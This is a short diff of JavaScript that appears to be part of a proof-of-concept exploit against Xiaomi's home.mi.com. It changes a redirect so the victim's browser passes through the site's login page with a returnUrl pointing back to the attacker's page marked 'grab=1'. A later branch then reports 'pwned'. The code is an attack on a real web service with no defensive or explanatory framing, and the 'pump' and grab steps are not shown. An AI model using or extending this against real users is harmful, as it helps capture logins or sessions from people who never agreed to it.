@@ -15,7 +15,8 @@ if (!/[?&]grab=1/.test(location.search)) {
     setInterval(pump, 0);                   
 
     setTimeout(function () {
-        location.href = 'https://home.mi.com/';
+        location.href = 'https://home.mi.com/app/shop/pages/setLogin/index.html?returnUrl='
+            + encodeURIComponent(location.origin + location.pathname + '?grab=1');
     }, 120);
 } else {
     document.getElementById('st').textContent = 'pwned';
